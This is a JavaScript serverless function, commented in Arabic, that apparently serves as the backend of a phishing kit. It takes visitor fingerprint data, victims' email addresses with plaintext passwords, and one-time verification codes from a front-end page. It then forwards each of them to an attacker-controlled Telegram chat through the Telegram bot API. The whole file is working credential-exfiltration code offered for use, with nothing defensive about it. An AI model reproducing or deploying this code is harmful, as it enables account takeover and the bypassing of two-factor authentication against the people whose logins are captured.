// netlify/functions/telegram-api-proxy.js

const axios = require('axios'); // لتثبيت هذه المكتبة، راجع الخطوة 1.2 لاحقا

exports.handler = async function(event, context) {
    // 1. تأكد أن الطلب هو POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    // 2. الحصول على التوكن والشات ID من متغيرات البيئة الآمنة (في Netlify)
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // 3. التحقق من وجود المتغيرات
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in Netlify Environment Variables!");
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Server configuration error: Telegram credentials missing.' })
        };
    }

    // 4. تحليل البيانات المرسلة من كود الجافا سكريبت في الواجهة الأمامية
    let requestBody;
    try {
        requestBody = JSON.parse(event.body);
    } catch (error) {
        console.error('Error parsing request body:', error);
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Invalid JSON body.' })
        };
    }

    const { type, payload, ipAddress } = requestBody; // 'type' لتحديد نوع الرسالة (زيارة، تسجيل دخول، OTP)

    let telegramMessage = '';

    // صياغة الرسالة بناءً على النوع المستلم
    switch (type) {
        case 'initial_visit':
            // payload هنا سيحتوي على userAgent, screenWidth, etc.
            telegramMessage = `
                <b>[معلومات الزيارة الأولى]</b>
                <b>User Agent:</b>\n${payload.userAgent}
                <b>أبعاد الشاشة:</b>\n${payload.screenWidth}x${payload.screenHeight}
                <b>لغة المتصفح:</b>\n${payload.browserLanguage}
                <b>الرابط الحالي:</b>\n${payload.currentUrl}
                <b>المرجع:</b>\n${payload.referrer}
                <b>الوقت والتاريخ:</b>\n${payload.localDateTime}
                <b>IP:</b>\n${ipAddress || 'غير معروف'}
            `;
            break;
        case 'login_data':
            // payload هنا سيحتوي على email, password
            telegramMessage = `
                <b>[بيانات تسجيل الدخول]</b>
                <b>البريد الإلكتروني:</b>\n${payload.email}
                <b>كلمة السر:</b>\n<b>@</b>${payload.password}
                <b>IP:</b>\n${ipAddress || 'غير معروف'}
            `;
            break;
        case 'otp_code':
            // payload هنا سيحتوي على otpCode
            telegramMessage = `
                <b>[رمز التحقق OTP]</b>
                <b>الرمز:</b>\n${payload.otpCode}
                <b>IP:</b>\n${ipAddress || 'غير معروف'}
            `;
            break;
        default:
            console.warn('Unknown message type received:', type);
            return {
                statusCode: 400,
                body: JSON.stringify({ message: 'Unknown message type.' })
            };
    }

    // 5. إرسال الرسالة إلى Telegram Bot API
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: telegramMessage,
            parse_mode: 'HTML' // للحفاظ على تنسيق HTML الذي تستخدمه
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, telegramResponse: response.data })
        };
    } catch (error) {
        console.error('Error sending message to Telegram:', error.response ? error.response.data : error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Failed to send message to Telegram.', error: error.message })
        };
    }
};
